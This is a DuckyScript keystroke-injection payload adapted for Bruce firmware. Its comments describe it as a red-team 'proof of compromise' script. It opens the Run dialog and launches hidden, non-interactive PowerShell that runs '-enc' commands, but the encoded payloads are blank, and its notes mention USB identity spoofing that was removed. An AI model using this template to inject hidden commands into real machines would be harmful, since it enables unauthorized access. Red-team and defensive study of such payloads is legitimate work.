REM [Bruce compat rewrite]: ATTACKMODE HID STORAGE VID_D3AD PID_B33F
REM MAN_RedTeamCompany PROD_DUCKY SERIAL_25102022 removed — Bruce's
REM ducky_typer.cpp has no ATTACKMODE support and no VID/PID/MAN/PROD/
REM SERIAL spoofing, it is always a plain HID keyboard with whatever fixed
REM identity the firmware reports. WAIT_FOR_STORAGE_INACTIVITY at the end
REM removed too — there is no mass-storage attack mode on Bruce to wait
REM on, replaced with a fixed DELAY to preserve the "pause before
REM finishing" intent. STRINGLN converted to STRING+ENTER.
REM Defining Attackmode & USB identifiers. These will help the blue team to identify the moment of compromise

REM Opening a hidden powershell instance which pops the message box
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -w h
ENTER
DELAY 750
STRING powershell.exe -enc ;exit
ENTER
DELAY 500
GUI r
DELAY 500

REM New powershell process for generating a proof of compromise screenshot - needs to be a seperate process because of the messagebox
STRING powershell -NoP -NonI -w h
ENTER
DELAY 750
STRING powershell.exe -enc ;exit
ENTER
DELAY 2000
DELAY 5000
